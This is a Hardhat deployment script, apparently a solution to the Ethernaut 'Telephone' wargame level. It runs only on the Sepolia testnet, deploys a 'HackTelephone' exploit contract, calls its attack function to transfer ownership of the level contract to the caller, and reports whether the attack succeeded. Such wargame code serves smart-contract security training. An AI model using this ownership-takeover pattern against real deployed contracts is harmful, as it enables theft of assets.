import { ethers, network } from "hardhat";
import * as dotenv from 'dotenv';
import { Contract, providers, Signer } from "ethers";

dotenv.config();

async function main() {
    // We only verify on Sepolia!
    if (network.config.chainId != 11155111) {
        console.log("Ethernaut contracts in this repo can only be run on the Sepolia Network");

    } else {
        // Initialize variables needed to access the telephone contract
        const contractAddress: string = process.env.CONTRACT_INSTANCE_ADDRESS ? process.env.CONTRACT_INSTANCE_ADDRESS : ethers.constants.AddressZero;
        const contract: Contract = await ethers.getContractAt('Telephone', contractAddress);

        // Load in account we want to inject as the owner of the telephone contract
        const desiredOwner: Signer = await ethers.provider.getSigner();
        const desiredOwnerAddress: string = await desiredOwner.getAddress();

        console.log("Contract Instance Loaded");

        // Deploy the telephone contract exploit with the address we want to make the owner of the original contract
        const exploitFactory = await ethers.getContractFactory("HackTelephone");
        const exploitTelephoneContract = await exploitFactory.deploy(contractAddress);

        console.log(`Telephone Contract Address: ${contract.address}`);
        console.log(`Exploit Contract Address: ${exploitTelephoneContract.address}`);
        console.log(`Desired Contract Owner Address: ${desiredOwnerAddress}`);

        console.log("Attacking contract...");
        await exploitTelephoneContract.attack(desiredOwnerAddress);
        // Verify that the contract owner has been changed to the desired owner
        if (await contract.owner() == desiredOwnerAddress) {
            console.log("--------Attack Successful---------")
        } else {
            console.log("----------Attack Failed-----------");
            console.log(`Contract owner: ${await contract.owner()}`);
        }
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    });